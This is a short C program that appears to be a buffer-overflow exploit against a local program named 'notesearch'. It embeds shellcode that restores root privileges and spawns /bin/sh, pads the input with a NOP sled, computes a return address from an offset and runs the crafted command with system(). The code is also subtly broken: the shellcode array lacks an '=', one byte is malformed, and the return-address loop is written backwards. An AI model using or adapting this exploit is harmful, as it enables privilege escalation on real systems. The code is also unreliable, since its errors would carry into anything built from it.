#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 



int main(int argc, char const *argv[])
{

	char shellcode[] "\x31\x3c0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
	
	unsigned int i;
	unsigned int *p;
	unsigned int ret;
	unsigned int offset = 270;

	char *command;
	char *buffer; 

	// Allocate space and zero it out 
	command = (char*) malloc(200);
	bzero(command, 200);	

	// Begin command buffer 
	strcpy(command, "./notesearch \'");

	// set buffer at end 
	buffer = command + strlen(command);
	
	// Set offset 
	if(argc > 1)
		offset =atoi(argv[1]);

	// Set return address 
	ret = (unsigned) &i - offset;

	// Fill buffer with return address 
	for(i=0; i < 160; i+=4)
		ret = *((unsigned int *)(buffer+i));
	memset(buffer, 0x90, 60);
	memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

	strcat(command, "\'");

	system(command);
	free(command);
}